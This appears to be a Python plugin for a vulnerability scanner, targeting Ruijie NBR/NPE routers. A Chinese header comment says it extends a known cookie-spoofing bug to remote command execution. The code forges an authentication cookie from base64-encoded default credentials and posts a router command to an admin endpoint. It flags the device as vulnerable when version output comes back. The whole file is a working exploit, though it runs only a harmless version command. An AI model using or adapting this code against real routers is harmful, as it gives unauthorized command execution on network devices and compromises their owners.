#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = LinE
#__refer__  = http://www.wooyun.org/bugs/wooyun-2010-0148657
'''
在refer中cookie欺骗漏洞的基础上发现了远程的路由命令执行
经过测试，发现锐捷的NBR NPE两个大类的路由器均存在此漏洞

'''

import urlparse
def assign(service, arg):
    if service == 'ruijie_router':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def base64(string):
    import base64
    return base64.b64encode(string)

def audit(arg):
    users = ['manager:manager','guest:guest']
    for user in users:
        cookie = "c_name=; hardtype=NBR1500G; web-coding=gb2312; currentURL=; auth=" + base64(user) +"; user=admin"
        posturl =  "/WEB_VMS/LEVEL15/"
        command = "show version"
        post = "command=" + command +"&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant."
        target = arg + posturl
        code, head, res, errcode, _ = curl.curl2(target,post=post, cookie=cookie)
        # print res
        if code == 200 and "System software version" in res:
            security_hole(user +" | " + arg)


            return arg
if __name__== '__main__':
    from dummy import *
